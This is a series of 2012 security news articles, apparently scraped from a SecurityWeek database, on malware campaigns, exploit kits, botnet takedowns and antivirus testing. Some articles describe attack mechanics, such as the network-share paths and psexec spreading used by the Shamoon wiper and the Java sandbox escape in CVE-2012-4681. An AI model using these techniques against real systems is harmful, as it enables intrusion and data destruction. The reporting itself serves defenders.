The failed protection rating made MSE the only anti-Virus product that didn’t earn AV-Test approval.  When it comes to the detection of widespread malware, MSE covered 100% of the spread, and the software matched 90% when it comes to detecting malware discovered within the last 2-3 months. However, zero-day threats, which includes Web and e-mail based attacks, is where MSE failed, scoring 69% in September and 64% in October.  It should be noted however, that Microsoft scored 10.5 points overall, and only needed 11 points to earn an AV-Test approval stamp. When it comes to the competition, BitDefender scored best overall (17 out of 18 possible points), followed by F-Secure/Symantec (tied), and Kaspersky.  “If you're using Windows 8, take these results as a wakeup call. Yes, Windows Defender is enabled automatically when no other antivirus is present, but its technology comes from the Microsoft products that failed the recent tests. Don't rely on it. Install a better antivirus right away,” commented Neil Rubenking, a reporter and AV reviewer for PC Mag.  \"Microsoft prioritizes protection based on impact and prevalence of malware affecting Microsoft customers from a global perspective,\" a Microsoft spokesperson told SecurityWeek in an emailed statement. \"The Microsoft Malware Protection Center actively supports third-party testers to use similar methodology in their test results. We reaffirm that Microsoft is committed to providing a trustworthy computing experience and continues to invest heavily in continuously improving our security and protection technologies.\" The last time MSE lost out on an AV-Test approval was in September 2010.

Last week, Symantec released a detailed analysis about a piece malware known as Narilam, which has primarily been targeting users in the Middle East though a small number of infections have been detected in the United States and the U.K. According to the company, the majority of the victims are corporate users.   Though the report received media coverage, authorities in Iran pointed out the malware is old and declared that it is not a threat for most users.   \"The malware called \"narilam\" by Symantec was an old malware, previously detected and reported online in 2010 by some other names,\" according to a translation of a statement from Iran-CERT. \"This malware has no sign of a major threat, nor a sophisticated piece of computer malware. The sample is not wide spread and is only able to corrupt the database of some of the products by an Iranian software company, those products are accounting software for small businesses. The simple nature of the malware looks more like a try to harm the software company reputation among their customers.\"   According to an analysis by Kaspersky Lab, Narilam was probably deployed during late 2009 and mid-2010.   \"Its purpose was to corrupt databases of three financial applications from TarrahSystem, namely Maliran, Amin and Shahd,\" Kaspersky Lab noted. \"Several variants appear to have been created, but all of them have the same functionality and method of replication.Reports from Kaspersky Security Network indicate that the malware was found mostly in Iran (~60%) and Afghanistan (~40%).\"   \"At the moment, we do not see any direct connection with other recent destructive malware (such as Shamoon or Wiper). Unlike Duqu or Flame, there is no apparent cyberespionage function,\" the analysis continued. \"The malware is currently almost extinct – during the past month, we have observed just six instances of this threat.\"   Symantec itself classified the threat as 'low' in terms of the distribution. Written in Delphi, the malware copies itself to the infected machine, adds registry keys and spreads through removable drives and network shares. What is more unique about it is that it has functionality to update a Microsoft SQL database provided it is accessible by Object Linking and Embedding Database (OLEDB), and specifically targets SQL databases with three distinct names: alim, maliran, and shahd.    \"The malware does not have any functionality to steal information from the infected system and appears to be programmed specifically to damage the data held within the targeted database,\" according to Symantec. \"Given the types of objects that the threat searches for, the targeted databases seem to be related to ordering, accounting, or customer management systems belonging to corporations.\"   \"Unless appropriate backups are in place, the affected database will be difficult to restore,\" Symantec warned. \"The affected organization will likely suffer significant disruption and even financial loss while restoring the database. As the malware is aimed at sabotaging the affected database and does not make a copy of the original database first, those affected by this threat will have a long road to recovery ahead of them.\" " }

The malware is a version of the Makadocs Trojan, which opens a backdoor on the compromised computer and tries to steal information. The latest version of the malware uses Google Docs are a proxy server to reach its C&C. \"Google docs has a function called viewer that retrieves the resources of another URL and displays it,\" blogged Takashi Katsuki of Symantec. \"Basically, this functionality allows a user to view a variety of file types in the browser. In violation of Google's policies, Backdoor.Makadocs uses this function to access its C&C server.\" \"It is possible that the malware author has implemented this functionality in an attempt to prevent the direct connection to the C&C from being discovered,\" the researcher continued. \"The connection to the Google docs server is encrypted using HTTPS, thereby making it difficult to be blocked locally. It is possible for Google to prevent this connection by using a firewall.\" This is far from the first time hackers have used non-traditional methods of communicating with their command and control infrastructure. Other pieces of malware have used Twitter and Facebook to receive instructions. According to Symantec, Makadocs hits users as a rich text format (RTF) file or Microsoft Word document. The malicious file does not use any vulnerability in order to drop its component; instead it relies on social engineering, Katsuki wrote. He explained that its attempts to lure the user into executing it with the title and content of the document, and that clues in the code lead him to believe the malware is primarily targeting people living in Brazil. The malware includes code to detect the operating system being used by the victim, including Windows 8 and Windows Server 2012. \"This is not necessarily a surprise for security researchers as we always encounter new malware when new products are released,\" Katsuki wrote. \"However, this malware does not use any particular function unique to Windows 8 and we know that this malware existed before the launch of Windows 8. Based on these facts, we believe this code must be an update to the malware.\" " }

The recent launch of Microsoft's Windows 8 operating system is no exception. According to Trend Micro, attackers have begun trying to rope users in with promises of antivirus. The malware, which the firm detects as TROJ_FAKEAV.EHM, follows the footsteps of a typical fake antivirus scheme by displaying a bogus scanning result to trick the user into purchasing the phony program. The only difference is this malware is packaged to look like a security program made for Windows 8, blogged Gelo Abendan of Trend Micro.  A second scheme utilizing the news of Windows 8 involves a phishing email designed to lure users to a website where they can download the operating system for free. Instead of the OS however, users are taken to a phishing site that asks for personally information, including email addresses, passwords and names that can be sold in the underground market. \"It is typical for cybercriminals to piggyback on the highly-anticipated release of any latest technology to take their malware, spam, malicious app to new heights,\" noted Abendan. \"The appearance of the Instagram app we previously reported coincided with the news of Facebook’s acquisition of the photo sharing app. Similarly, malicious versions of Bad Piggies surfaced right after the app’s launch.\" \"To stay safe, users must keep their cool and think twice before clicking links or visiting webpages, especially those that promise the latest items or programs for free,\" Abendan added.

The paper, 'Detecting APT Activity with Network Traffic Analysis', outlines techniques that can be used to identify command-and-control (C&C) communications related to targeted attacks, explained Nart Villeneuve, senior threat researcher at Trend Micro, who authored the report along with Trend Micro Threat Research Engineer James Bennett. \"Today’s successful targeted attacks use a combination of social engineering, malware, and backdoor activities,\" he blogged. \"Though there are a variety of tools available to attackers, they tend to prefer specific ones. While they can routinely create new malware executables with automated builders and embed them in documents designed to exploit vulnerabilities in popular office software, the traffic generated by the malware when communicating with a C&C server tends to remain consistent.\" As examples, the paper cites a number of well-publicized attacks such as Nitro and GhostNet, as well as ongoing campaigns such as Enfal. Also known as \"Lurid downloader\", Enfal has been used in targeted attacks going back as far as 2006, according to Trend Micro. Several versions of the malware exist, but the communication between compromised hosts and a command and control server remains consistent. \"Enfal makes requests for files that contain any command that the attackers want the compromised computers to execute,\" according to the report. \"These requests can be detected because they follow a specific format that includes two directories, followed by the hostname and MAC address of the compromised computer. This consistent pattern is still detected despite modifications made to Enfal.\" In another example, the authors took aim at the Sykipot campaign. While older versions of the Sykipot malware communicated with a C&C via HTTP, newer versions have been spotted using HTTPS, and by 2008, the encryption had made the malware impossible to detect based on URL path. However, the malware remained detectable at the network level because of the use of consistent elements within the secure sockets layer (SSL) certificate, the authors contend. Even when new versions of the malware were detected this year, the SSL certificate on the server remained detectable using an already publicly published SNORT rule. \"[Trend Micro] Deep Discovery specifically detects the SSL certificate Sykipot malware uses,\" the report notes. \"In addition, generically detecting suspicious SSL certificates has proven quite useful at proactively detecting zero-day malware, including the recently discovered Gauss malware. Looking for default, random, or empty values in SSL certificate fields and restricting such detections to only certificates supplied by hosts outside an organization’s monitored network provides a great balance of proactive detection with manageable false positives.\" \"The ability to detect APT activity at the network level is heavily dependent on leveraging threat intelligence,\" the report states. \"A variety of very successful ongoing campaigns can be detected at the network level because their communications remain consistent over time.\" According to the paper, attackers have already begun to adapt. In the case of the Sykipot Trojan for example, which was linked earlier this year to attacks against the aerospace industry, users have switched from utilizing HTTP to encrypted HTTPS communications. This means that pattern matching based on the consistent URL path Sykipot uses can be evaded, the authors note, adding that newer versions of Sykipot have also been seen using different URL paths. \"Modifications made to malware’s network communications can, however, disrupt the ability to detect them,\" the report concludes. \"As such, the ongoing development of threat intelligence based on increased visibility and information sharing is critical to developing indicators used to detect such activity at the network level.\" The full report is available here in PDF format.

Built off the Zeus source code, the October release of v1.3.4.1 \"Rain Edition\" of the malware costs nearly $3,400 off the shelf, according to EMC's RSA security division. The new version has been enhanced with a simplified interface to accommodate new users and to alleviate the amount of work by Citadel's support staff. But perhaps even more importantly, the latest version of the malware has been armed with a new feature known as \"Dynamic Config\" that enables botmsters to have quicker interactions with infected victims through browser injection technology. \"This nifty function allows Trojan operators to create web injections and use them on the fly, pushing them to selected bots without the hassle of pushing/downloading an entire new configuration file,\" explained Limor Kessem, a cyber intelligence expert at RSA. \"Citadel-infected machines are going to have an instruction to reach out to the C&C every two minutes and update themselves with a predefined file where injection “packs” will be ready to go,\" she continued. \"The whole system will be managed by a clever distribution mechanism dictating which injection(s) go to which bot or group of bots. The format will be fully “Zeus-compatible,” of course.\" This will not cancel out the configuration file or the injections it already contains, she added, and botmasters can choose whether to use both simultaneously. If an injection in the usual config already has a more recent version, the newest will automatically be used. \"The new mechanism is designed right into Citadel’s Fraud-as-a-Service model,\" she blogged. \"Botmasters will be able to grant limited access to hired help. Up to five blackhat programmers (per admin) will be afforded a username and password combination to their own section on the administration panel.

In an analysis of phishing schemes between July and August, researchers at Websense found that 38.5 percent of the phishing attacks they detected were conducted on Friday, with Monday (30 percent) and Sunday (10.9 percent) coming in at second and third, respectively.  \"The bad guys know potential victim’s behavioral patterns,\" blogged Patrik Runald, director of research for Websense Security Labs. \"They know worker’s minds can stray on Fridays in a more relaxed setting. Relaxation and anticipation of the weekend can lead to more web browsing and an increased likelihood to click on links in emails. Similarly, stricken by a case of the Monday Blues, workers are also more likely to wander. By studying these behavioral elements, phishers know that they can increase their success rate. These guys are masters of lures and understanding their subjects.\"  The United States leads the way as far as countries hosting the most phishing URLs between Sept. 30, 2011, and Oct. 1, 2012. According to Websense, all but one of the top five phishing email subject lines are related to security. Between July and September, the most common subject line used by phishers was \"Your account has been accessed by a third party,\" the firm said.  \"How many times have you been browsing a web page and you get a pop up warning you that your computer is compromised? Most of us now know that these popups are the result of a fake AV scam and many of us have been conditioned not to click on these,\" Runald blogged. \"However, if you receive a security alert email that looks like it comes from an organization you have a relationship with, such as a bank, or a social network you are a member of, it may increase your likelihood to click.\" Just recently, FireEye published a report about social engineering that showed cybercriminals also look to create a sense of urgency about mail or express shipments to dupe unsuspecting victims into downloading malware. During the first half of 2012, malicious file names detected by FireEye often used the words 'DHL' (23.42 percent), 'notification' (23.37 percent) and 'delivery' (12.35 percent). During the second half of 2011, the top three most common words used in malicious file names were 'label', 'invoice' and 'post', FireEye found. \"Spear-phishing is one of the most pressing issues IT officers face today, and one they feel the least confident addressing,\" Runald wrote. \"Spear-phishing by definition isn’t a widely cast net.

A majority of the malware are mass distributed through phishing emails masquerading as coming from trusted brands or from plain spam, Solutionary said in its first quarterly research report, covering the third quarter of 2012, released Thursday. The original plan was to present an analysis of all the analyzed malware samples, but the Security Engineering Research Team at Solutionary decided to narrow the focus on to the BlackHole exploit kit and payload after realizing how BlackHole attacks dominated the quarter, Solutionary said.  Email remained the most common way to deliver banking Trojans, Solutionary said in its report, and malicious pages built using the BlackHole exploit toolkit proliferated during the quarter. Recent Solutionary analysis suggests BlackHole represents 67 percent of all exploit kit attacks, making it the most popular kit among cyber-criminals.  \"The malware types identified in our report impact enterprises, SMBs, government agencies and consumers,\" said Rob Kraus, director of SERT.  While several large financial institutions were hit by a wave of distributed denial of service attacks at the end of September, most small-to-midsized financial institutions battled a BlackHole campaign that used DDoS attacks as a diversionary tactic.  Large financial institutions, including Bank of America, Wells Fargo, PNC Bank, and JPMorgan Chase, experienced high traffic volumes and intermittent outages within a few days of each other over a two week period. While these highly disruptive attacks don't appear to have resulted in financial fraud or theft, the group responsible or the motivations are still unclear.  Solutionary referred to the warnings from the Federal Bureau of Investigation (FBI) and the Internet Crime Complaint Center in September in its analysis of the BlackHole operation against smaller financial organizations. In these attacks, banking personnel were targeted with spam containing malicious links directing victims to BlackHole-enabled Websites. When the users clicked on the link, they were infected with banking Trojans, usually ZeuS or Cridex, according to Solutionary. What made this campaign different from any other fraudulent wire transfer operation was the fact that many of the victims were also hit with DDoS attacks.  The fraudulent wire transfers were preceded, or followed-up by, DDoS attacks to cover up the fraudulent activity being conducted, Solutionary said in its report. In some cases, the attacks were launched with the DirtJumper botnet.  \"Cybercriminals constantly evolve malware and attack techniques to evade security and gain the most profit from their targets,\" said Kraus.  Solutionary found that 92 percent of malware samples analyzed by SERT over the last quarter were mass-distributed malware. Of the malware, the majority were banking Trojans, including ZeuS, Gameover, and Cridex. In fact, the report found that of the sample analyzed over the quarter, 91 percent of the banking Trojans actually belonged to the Cridex family.  Cridex copies itself to the victim's system and attempts to inject itself into several processes that are running at the time. Like ZeuS, Cridex has a configuration file which lists HTML pages and Websites it can inject code into. Cridex is not just after banking information, as it can harvest user credentials for social media sites and monitor and manipulate cookies. The harvested data is saved to a file and sent back to a command-and-control server.  \"Only 54 percent of those samples were detect by common anti-virus software at the time of analysis,\" Solutionary said in its report, noting that the variants were relying on obfuscated code to avoid detection.

While the FDA looks at unintended threats that would arise from electromagnetic activity, improper software testing, and access control issues, the agency has not looked at the potential for intentional harm, the US Government Accountability Office said in a report released back in August. The report recommended the FDA carefully evaluate threats to medical devices and put strategies in place to mitigate known vulnerabilities before allowing the device to go to market.  The FDA needs to think about risk management, patch and vulnerability management, technical audit and accountability, and security incident response, the GAO report said.  \"Even the human body is vulnerable to attack from computer hackers,\" Rep. Anna G. Eshoo (D-Calif) said in a statement.  While implantable medical devices have \"tremendous medical benefits,\" the possibility of attack—while still rare— means the FDA and manufacturers need to work together to identify, evaluate and fix potential security holes in those devices, Eshoo said.  Researchers have recently demonstrated how an attacker could compromise medical devices such as defibrillators, insulin pumps, and pacemakers. While the attacks required a lot of work to carry out, researchers were able to remotely manipulate devices because the devices had poor access controls.  For example, in a Black Hat presentation last year, Jay Radcliffe demonstrated how to intercept wireless signals emitted by the insulin pump and send commands to interfere with normal operation. In October 2011, McAfee's Barnaby Jack overrode an insulin pump's radio control and its safety alert feature and dumped more than one week's supply of insulin in one dose.  The FDA did \"not consider information security risks from intentional threats as a realistic possibility until recently,\" the GAO found.  The report identified potential scenarios, such as draining the battery, intercepting data transferred from the device or sending altered information to the device to interfere with normal operations, and disabling alarms and other warning mechanisms on the device. Attackers could exploit remote access to take over the device, or break in to the device using its wireless capabilities as a point of entry, and bypass authentication processes, the report found. Potential attacks can take advantage of older products, which may not have been designed with security in mind, or the fact that not all devices can easily be patched or updated if software flaws are identified.  \"Patients need to be informed about whether the medical devices implanted in their bodies contain security vulnerabilities that could harm them so they can take appropriate precautions whenever possible,\" said Rep. Edward J. Markey (D-Mass).   The GAO report made four recommendations to the FDA. First of all, the agency focus on what potential threats, vulnerabilities, and security risks manufacturers identify during the approval process. The agency should also consider strategies for mitigating the identified risks. The responsibility doesn't end as soon as it hits the market, since the FDA should continue efforts to identify and investigate security issues.  The FDA should take advantage of all \"available resources,\" especially from other agencies, such as National Institute of Standards and Technology, the report recommended. In fact, the agency has been working towards a collaborative relationship with the Department of Homeland Security, NIST, Department of Defense, and other federal law enforcement agencies, Jim Esquea, assistant secretary for legislation at the Department of Health and Human Services, wrote in the comments to the GAO report.  The agency also needs to react with a specific plan and timetable for implementing fixes once problems have been identified, the GAO suggested.

The connection comes from a payload being delivered by sites using the vulnerability to target systems, which has the same attack process used by the PlugX gang.   Last week, AlienVault published a detailed blog post on the PlugX RAT (Remote Access Trojan), going so far as to name the author of the malware itself. His identity was discovered after decoding the RAT itself and examining the payloads, which were an NVidia executable (NvSmart.exe), and a DLL (NvSmartMax.dll).  The fact that the .exe is signed with a valid signature means that it will bypass some system protections and can be loaded in some cases each time the infected host starts. It’s a clever and common method for some malware authors, and creates a tricky situation when it comes to disinfecting a compromised system.  “Once NvSmart.exe is executed, it loads NvSmartMax.dll. The attackers drop a modified version of NvSmartMax.dll which executes the binary content present on boot.ldr that contains the actual malicious code,” the post explains. Using a debugger on the code, file system paths were discovered, which led them on a trail of evidence, all pointing to “whg0001” who is a “virus expert” that develops on a Windows system, likely in an office if the folder directories discovered are any indication.  Less than a week later, the same NVidia files are being used to deliver payloads by leveraging the latest Internet Explorer vulnerability. Given that the vulnerability was being used to deliver Poison Ivy (another RAT), the link to PlugX isn’t all that shocking. However, it's hard to deny that “whg0001” is the person who is behind this latest attack, as his computer’s filepath is still easily located when examining the latest malware samples.  “We know that the group actively using the PlugX malware also called Flowershow had access to the Internet Explorer ZeroDay days before it was uncovered. Due tot he similarities of the new discovered exploit code and the one discovered some days ago it is very likely that the same group is behind both instances,” AlienVault’s Jamie Blasco explained in a blog post.  “It seems the guys behind this 0day were targeting specific industries. We’ve seen that they compromised a news site related to the defense industry and they created a fake domain related to LED technologies that can be used to perform spearphishing campaigns to those industries.”  Microsoft has confirmed the Internet Explorer vulnerability, which impacts all versions of the browser, except Internet Explorer 10. According to the software giant, a fix is in the works, but they have not given a timeline.  In the meantime, a security advisory from Microsoft outlines some basic mitigation steps that will help to stave off attack.    " }

Microsoft's Digital Crimes Unit won the right to host the 3322.org domain after the company was granted an ex parte temporary restraining order against Peng Yong; his company, Changzhou Bei Te Kang Mu Software Technology Co.; and others identified only as John Does, blogged Richard Domingues Boscovich, assistant general counsel in Microsoft Digital Crimes Unit. The decision by the U.S. District Court for the Eastern District of Virginia enables Microsoft to block the operation of a relatively small botnet known as Nitol, as well as nearly 70,000 malicious subdomains hosted on 3322.org linked to more than 500 different strains of malware, Boscovich added. According to Boscovish, the Nitol malware is used to carry out distributed denial of service (DDoS) attacks that are able to cripple large networks. It also creates backdoors on the victim’s computer. \"The discovery and successive action against the Nitol botnet stemmed from a Microsoft study looking into unsecure supply chains,\" he blogged. \"The study confirmed that cybercriminals preload malware infected counterfeit software onto computers that are offered for sale to innocent people. In fact, twenty percent of the PCs researchers bought from an unsecure supply chain were infected with malware. Making matters worse, the malware was capable of spreading like an infectious disease through devices like USB flash drives, potentially causing the victim’s family, friends and co-workers to become infected with malware when simply sharing computer files.\" Microsoft was assisted in the case by DNS security provider Nominum, which served as a declarant in the legal case and helped filter the 3322.org domain traffic. However, the former owners of 3322.org have reacted by posting advice on how customers can bypass disruption efforts by Microsoft. \"From a Damballa Labs perspective, we currently track around 70 different botnets that currently leverage 3322.org's DNS infrastructure for C&C resiliency - using a little over 400 different third-level domain names of 3322.org,\" blogged Gunter Ollmann, vice president of research at Damballa.  \"Will the usurping of 3322.org kill these botnets? Unfortunately not,\" he continued. \"There may be a little disruption, but it's more of an inconvenience for the criminals behind each of them. Most of these botnets make use of multiple C&C domain names distributed over multiple DNS providers. Botnet operators are only too aware of domain takedown orders from law enforcement, so they add a few layers of resilience to their C&C infrastructure to protect against that kind of disruption.\" " }

Black Hole is one of the most popular exploit kits on the Web, accounting for nearly 40 percent of all toolkits detected on the Web by security firm AVG Technologies in the first quarter of 2012. An advertisement for the new 2.0 version of the kit was posted to Pastebin. According to an English translation viewable here, the seller states that the prices for the kit range from $50 to rent for a day and $1,500 to license for a year. According to Websense, among its new features the latest version contains dynamic URL generation so there is no longer a standard URL pattern that can be used to identify the kit. In addition, IP blocking is used at the executable URL so that AV companies cannot just download the binary.   As another shield against researchers, CAPTCHA protections are used in the administration panel login page to prevent brute force attacks. Vikram Thakur, principle security response manager for Symantec, said the enhancements seem to be aimed at making life harder for security solutions and researchers. \"Day in and day out we see attackers trying to circumvent security solutions, and the updates to the Black Hole kit are no different,\" he said. \"Mature security solutions…adapt to such attempts and protect the computer users. The other changes mentioned in the release notes are geared towards the security of the control panel for the kit itself; the author is attempting to protect the investment made by his or her customers.\" Recently, Black Hole was one of the exploit kits at the center of attacks targeting the Java vulnerability CVE-2012-4681. Updating vulnerabilities gives Black Hole a higher infection rate, while the constant updating of code obfuscation keeps security vendors on their toes, said Chris Astacio, manager of security research at Websense.

{ "_id" : { "$oid" : "5b27c5d86cefc41c844ab4c8" }, "Category" : "Malware", "Title" : "Wave Systems Launches TPM-Based Malware Detection Technology", "Address" : "https://www.securityweek.com/wave-systems-launches-tpm-based-malware-detection-technology", "Date" : "September 11, 2012", "Article" : "Wave Systems' new endpoint security product relies on a chip on the computer's motherboard to detect malware infections.  The Wave Endpoint Monitor takes advantage of the Trusted Platform Module chip's built-in security capabilities to provide businesses with advanced protection against sophisticated malware and advanced persistent threats, Wave Systems said Tuesday. The Wave Endpoint Monitor provides increased visibility into what is running on the computer even before the operating system launches, the company said.  Rootkit attacks hide in host systems and evade many mainstream security methods such as antivirus software, Wave Systems said. They are hard to detect because they burrow into the BIOS and the Master Boot Record (MBR), making them invisible to the operating system or security software running within the operating system. Rootkits can also replace the machine firmware with a malicious one, causing even more damage.  \"Since advanced persistent threats can sometimes appear as normal traffic, new rootkits often go unnoticed for long periods of time and cause severe damage in the form of infected systems and data loss,\" Steven Sprague, CEO of Wave Systems, said in a statement.  Wave Systems addresses the problem by analyzing the information collected and stored within the Trusted Platform Module security chip which is built in and usually enabled on most modern systems. The TPM module can capture data about the PC's overall health by keeping track of what is going on in the BIOS and MBR. By being able to see what is going on under-the-hood, TPM can see infections and malicious activity that the operating system can't detect.  The TPM chip includes shielded memory locations called the Platform Configuration Registers (PCRs), Brian Berger, executive vice president of Wave Systems, told SecurityWeek. PCRs are storage locations designed to store hashes of critical start-up values, including statistics for pre-OS components such as the BIOS. Wave Endpoint Monitor analyzes these protected values and uses them to detect any changes in the pre-OS components, Berger said. When an anomaly is found, Wave Endpoint Monitor sounds an alert.  \"Storing security data in hardware is inherently more secure than storing it in software,\" Berger said.  Wave Systems piloted Wave Endpoint Monitor with \"several government groups\" over the past six months, according to the company. While information and details about the pilot program are highly confidential, Berger said the pilot programs ranged from lab to user environments. \"The clients have been very positive about the results of the pilots,\" Berger added.  Wave Endpoint Monitor can work with computers installed with any version of TPM 1.2, Berger said. Wave Systems offers a central, remote TPM management application that can help organizations centrally manage systems using TPM, Berger said.  \"Wave Endpoint Monitor allows IT to utilize the hardware security you've already bought and deployed to ensure PC health from the start of the boot process while creating a higher level of trust in your endpoints,\" Sprague said.

The new version of the malware – detected by the firm as W32.Disttrack – wipes files by overwriting them with 192KB blocks of randomly generated data as opposed to the previous version, which used a 192KB block filled with a partial image of a burning U.S. flag. Shamoon is believed by many to have been used in an attack last month on Saudi Aramco, the national oil company of Saudi Arabia. It is also has been linked by some to an attack that forced one of Qatar's two main LNG (Liquid Natural Gas) production and export companies offline. \"The initial infection vector remains unconfirmed and may vary in different organizations, but once W32.Disttrack is inside a network, it will attempt to spread to every computer within the local area network via network shares,\" according to Symantec's Security Response Team. \"While Shamoon may piggyback on existing machine-to-machine credentials, typically Shamoon attackers have gained access to domain credentials and the domain controller itself, allowing them access to all machines on the local domain.\" The malware uses a hardcoded \"wiping date\" read from the .pnf file it creates on the file system, Symantec said. It will periodically check this date. Once it has passed, the malware will drop and execute the wiper component, which will target a prioritized list of files before moving on to the master boot record and active partition. Once a target is found, Symantec said it will attempt to open and close the following files to determine that it has access:  \\\\[TARGET IP]\\ADMIN$\\system32\\csrss.exe \\\\[TARGET IP]\\C$\\WINDOWS\\system32\\csrss.exe \\\\[TARGET IP]\\D$\\WINDOWS\\system32\\csrss.exe \\\\[TARGET IP]\\E$\\WINDOWS\\system32\\csrss.exe \"If successful, it will then copy itself to the remote system32 directory and attempt to execute itself using psexec.exe,\" the response team explained. \"If unsuccessful, it will try to load itself as a remote service. Once it has successfully looped through all target machines it will delete itself.\" Last month, Saudi Aramco officials said that 30,000 workstations were impacted by the cyber-attack. However, it was able to clean the systems and restore them to service. " }

The vulnerability, CVE-2012-4681, was patched earlier today by Oracle following reports that attackers are circling, including those using the infamous Black Hole toolkit. Now, according to Symantec, the group behind the Nitro attacks targeting the chemical industry has added the vulnerability to its malicious toolbox. \"The traditional modus operandi of the Nitro attackers is to send an email to victims,\" Symantec's Security Response team noted in a blog post. \"That email contains an attachment, which is a password-protected self-extracting zip file. The email claims to be an update for some piece of commonly installed software. The targeted user extracts it, runs it, and is infected with a copy of Backdoor.Darkmoon (also known as Poison Ivy).\" The Nitro attacks were first detected by security pros last year. The attack campaign began in April 2011, and was initially targeting human rights organizations. Eventually, the attackers moved on to the chemical sector. Among the victims were multiple Fortune 100 companies involved in research and development of chemical compounds, as well as companies that develop materials for military vehicles. In this latest round of attacks, the hackers have turned to compromised websites to infect their victims using a .jar file. The attackers are still utilizing the remote administration tool Poison Ivy as well as the command-and-control infrastructure and file names from previous attacks, Symantec found. It is likely the attackers are sending emails to targeted users that contain a link to the malicious site, the firm said. \"The (Java) vulnerability consists of a privilege escalation due to a class that allows access to protected members of system classes, which should not be accessible,\" Symantec explained. \"Because of this, malicious code can bypass the restrictions imposed by the sandbox and use the “getRuntime().exec()” function in order to execute a malicious payload. In our tests, we have confirmed that the zero-day works on the latest version of Java (JRE 1.7), but it does not work on the older version JRE 1.6.\" " }

Security researchers from FireEye worked with Internet service providers in Russia, the Netherlands, and Panema to shut down the command-and-control servers controlling the Grum botnet. The last server Ukraine was shut down July 18. Symantec researchers at the time estimated that Grum was responsible for one-third of all spam being sent worldwide, and its takedown led to an immediate drop in global spam email volumes by as much as 15 to 20 percent, according to July's Symantec Intelligence Report.  However, the drop was only temporary, since in the days since, the global volumes have been creeping up, Eric Park, an Abuse Desk Analyst at Symantec, told SecurityWeek. In fact, if the present trend continues, August may wind up with a higher global spam volume than in July, Park said. According to Symantec's July report, global spam volume was 67.6 percent (1 in 1.48 emails was flagged as spam), an 0.8 percent increase over June.  There's been \"minimal to no change\" in spam as a result of the Grum takedown, Park said.  While Grum had an estimated hundred thousand zombies sending spam, the machines were likely blocked for sending emails too frequently, or wound up on IP blacklists, said Andrew Conway, Cloudmark researcher. IP filtering is fast and cheap, and is a good first line of defense against spam, Conway said. Grum spam was easy to blacklist, and despite its size, most spam messages from the botnet probably never reached user inboxes.  Even in the heyday of spam botnets, in the period between 2007 and 2010, Grum was \"a distant sixth\" in terms of size and in number of spam generated, Mary Landesman, a senior security researcher at Cloudmark, told SecurityWeek. Rustock, shut down in 2011, had 150,000 bots and sent out 30 billion messages per day at its peak, compared to Grum, with a mere 50,000 bots and only 2 billion spam messages per day, Landesman said.  The big players, such as Storm, Rustock, and Srizbi, are no longer in action, which left Cutwail, Bobax and Grum as the \"top 3\" spam botnets. Cutwail and Bobax has been up and down over the past two years and haven't really had much of an impact, making Grum appear to be a larger player in the botnet-drive spam space than it really was, Landesman pointed out.  Considering that users never saw Grum-delivered spam to begin with, the lack of an impact is not surprising, Landesman said.  Global spam has actually been declining since 2008. Symantec's Park ran some numbers, and saw that a month before the McColo botnet was shutdown in 2008, global spam volume was 5.8 trillion. In June 2008, when the botnet was shutdown, spam volume was 3.1 trillion, and a month later, spam had dropped even more to 2.5 million. The numbers crept up a bit after that, and a month before the Bredolab botnet and Spamit affiliates were knocked off line in 2010, total spam volume was 3.8 trillion. In October 2010, after the botnets were no longer operational, the spam volume was 2.9 trillion, and dropped to 2.4 million a month later.  By the time Microsoft focused its attention on the Rustock botnet, global spam volume was a shadow of what it was before McColo's demise. A month before Rustock's shutdown, spam volume was 1.6 trillion. Volume dropped to 1.3 trillion in March 2011 when authorities seized the C&C servers, and slid down to 1.2 trillion a mother later.  Each botnet shutdown has had less impact on global spam volumes compared to earlier shutdowns, Park pointed out. While the percentages look great —spam declined 57 percent after McColo, 37 percent after Bredolab and Spamit affiliates,and 25 percent after Rustock—the drop in numbers are getting smaller, Park said.  While Park didn't have global spam volume figures handy for the most current month, he noted that daily global spam volume was about 25 billion in mid-June, a month before Grum's last C&S server was turned off on July 18. The number dropped to about 12 billion to 15 billion between July 18 and July 22, Park said. By Aug. 13, daily spam volume was consistently over 50 billion by Aug. 9.  Recovering from the spam drop was really quick, surprisingly so, after the Grum takedown, Park said.  The numbers are different, but the trend tells the same story when looking at spam volume figures from other companies. AppRiver saw spam volumes recover within a week to the levels observed in June, Troy Gill, a security analyst with AppRiver, told SecurityWeek.  \"We do not currently see any signs of a comeback from the Grum botnet, yet traffic remains equal to the rates we were seeing before the takedown,\" Gill said.  It's important to note, also, that spammers have turned away from very large botnets for spam delivery in favor of smaller, more focused and presumably more easily managed botnets, Landesman said. This means there are more botnets, each one with less individual impact, while the total impact on global spam volume remained about the same.  The spam-delivery market is \"very fluid,\" Gunter Ollmann, vice-president of research at Damballa, told SecurityWeek. There are multiple \"suppliers\" offering medium-to-large botnets for spam campaigns, and the operators tend to \"subscribe\" to multiple suppliers, Ollmann said. As a result, \"takedowns of an individual supplier can be counteracted within a day or two,\" Ollmann said.  Symantec's Park also felt that the spammers had learned their lessons from previous takedowns and have diversified their infrastructure. Instead of one large botnet they are using for all their needs, they have multiple networks, one for fake pharmaceutical, one for online gambling, and so on, making it easy to remain in business even after one takedown. They've learned \"not to put all their eggs in one basket,\" Park said.  The Grum takedown has important implications from a law enforcement standpoint, because increasing the cost of business can act as a deterrent for future operations, Park and Landesman agreed. However, it's also important to consider the dissenting opinion, that the takedown did nothing to stop the criminals, and may have actually caused some harm, Gunter Ollmann, vice-president of research at Damballa, told SecurityWeek.  \"The 'Takedown' was ineffectual,\" Ollmann said, as it shut down servers but did nothing to stop the techniques the operators had used to infect victims and build the botnet in the first place, nor did it result in the arrests of the actual criminals. In fact, the \"ill-conceived takedown\" alerted the botnet operators to some of the mistakes the Grum team had made that allowed the researchers to track them, which means it will be even more difficult to build up future evidence against these spammers, Ollmann said.  These actions have simply caused \"the bot masters to improve their botnets and further insulate themselves from the errors that allow more strategic law enforcement operations to be successful,\" Ollmann said.

